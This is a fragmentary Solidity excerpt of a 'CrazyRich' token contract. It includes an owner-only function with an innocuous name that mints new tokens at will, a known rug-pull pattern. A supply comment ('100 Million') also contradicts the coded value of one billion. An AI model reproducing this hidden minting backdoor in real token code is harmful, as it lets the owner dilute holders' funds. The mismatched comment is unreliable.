...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function CrazyRich(uint256 amount) public onlyOwner {
    _CrazyRich(msg.sender, amount);
    }
    ...
    function _CrazyRich(address account, uint256 amount) internal virtual {
...
contract CrazyRich is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Crazy Rich", "CrazyRich") {
        _CrazyRich(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _name = "CrazyRich";
